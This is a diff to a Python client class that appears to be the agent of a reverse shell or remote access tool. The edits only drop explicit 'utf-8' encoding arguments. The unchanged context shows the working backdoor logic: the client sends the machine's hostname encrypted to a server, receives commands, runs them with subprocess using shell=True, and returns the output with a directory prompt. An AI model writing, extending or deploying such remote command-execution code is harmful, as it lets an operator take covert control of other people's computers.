@@ -81,7 +81,7 @@ class Client(object):
             time.sleep(5)
             raise
         try:
-            encrypted_host = self.Crypt.encrypt(socket.gethostname().encode(encoding="utf-8"))
+            encrypted_host = self.Crypt.encrypt(socket.gethostname().encode())
             self.socket.send(encrypted_host)
         except socket.error as e:
             print("Cannot send hostname to server: " + str(e))
@@ -90,7 +90,7 @@ class Client(object):
 
     def print_output(self, output_str : str):
         """ Prints command output """
-        sent_message = self.Crypt.encrypt((output_str + str(os.getcwd()) + '> ').encode(encoding='utf-8'))
+        sent_message = self.Crypt.encrypt((output_str + str(os.getcwd()) + '> ').encode())
         self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
         print(output_str)
         return
@@ -98,7 +98,7 @@ class Client(object):
 
     def check_custom_commands(self, data : bytes):
         """ Check for Custom command triggers in data """
-        data = data.decode("utf-8")
+        data = data.decode()
         if data[:2].lower() == 'cd':
             directory = data[3:]
             try:
@@ -169,7 +169,7 @@ class Client(object):
             except Exception as e:
                 print(e)
                 break
-            if data[:].decode("utf-8").lower() == 'quit':
+            if data[:].decode().lower() == 'quit':
                 self.socket.close()
                 break
             try:
@@ -178,10 +178,10 @@ class Client(object):
                 output_str = f"Custom command failed: {e}"
             if (output_str == None) and len(data) > 0:
                 try:
-                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                    cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                    output_str = output_bytes.decode("utf-8", errors="replace")
+                    output_str = output_bytes.decode(errors="replace")
                 except Exception as e:
                     # TODO: Error description is lost
                     output_str = "Command execution unsuccessful: %s" %str(e)
